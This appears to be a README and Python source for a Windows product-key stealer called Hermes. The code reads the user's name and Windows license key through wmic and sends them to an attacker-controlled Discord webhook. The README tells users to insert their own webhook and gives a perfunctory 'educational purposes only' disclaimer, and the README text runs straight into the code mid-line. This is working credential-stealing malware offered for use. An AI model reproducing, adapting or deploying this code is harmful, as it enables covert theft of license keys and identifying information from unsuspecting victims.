# Hermes-Windows-Key-Stealer

Simple Windows Key Stealer that uses discord webhooks to send the windows key. Replace the webhook in the code


Use for educational purposes only, im not responsible for shitdef winkey():
    NAME = os.getenv("UserName")
    KEY = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
    KEY_TYPE = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    if KEY == '':
        KEY = 'WINKEY : NOT AVAIL.'
    else:
        pass   
    embed = Embed(
        title=f'WINDOWS KEY :',
        description=f'NAME > {NAME}\nTYPE > {KEY_TYPE}\nKEY > {KEY}',
        color=0x2f3136
        )
    embed.set_thumbnail('https://wallpaperaccess.com/full/1129133.jpg')
    winkeysteal = Webhook(winkey_hook)
    winkeysteal.username = 'gotcha! winkey'
    winkeysteal.avatar_url = 'https://cdn.discordapp.com/attachments/739948762792984590/791347256103796796/1129133.png'
    winkeysteal.send(embed=embed)
